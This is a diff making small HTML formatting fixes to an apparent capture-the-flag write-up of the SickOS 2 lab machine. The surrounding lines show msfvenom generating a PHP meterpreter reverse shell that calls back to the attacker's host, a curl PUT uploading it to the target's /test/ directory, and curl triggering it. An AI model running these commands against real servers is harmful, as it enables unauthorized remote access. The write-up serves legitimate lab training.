@@ -73,6 +73,7 @@ Upload using:
 </pre>
 Browse to /test/shell.php to confirm code execution as www-data.
 
+
 **🧠 Reverse Shell with Meterpreter**
 
 Now that we know we can upload arbitrary PHP scripts and execute them, let’s try to spawn a shell on the machine. We use msfvenom to generate the appropriate payload.
@@ -80,7 +81,7 @@ Now that we know we can upload arbitrary PHP scripts and execute them, let’s t
   root@kali:~/sickos2# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.3 LPORT=4444 > shell.php
 </pre>
 Note that 192.168.2.3 is the IP of our Kali box, where we will listen for the incoming reverse shell. Using the same command as before, we start by uploading this script on the server.
-<pre
+<pre>
 root@kali:~/sickos2# curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php
 </pre>
 
@@ -104,7 +105,7 @@ msf exploit(handler) > run
 </pre>
 
 Then, from another terminal, we trigger the PHP script that will connect back to our attacking machine.
-<pre
+<pre>
   root@kali:~/sickos2# curl 192.168.2.4/test/shell.php
   > ls
 execute.php
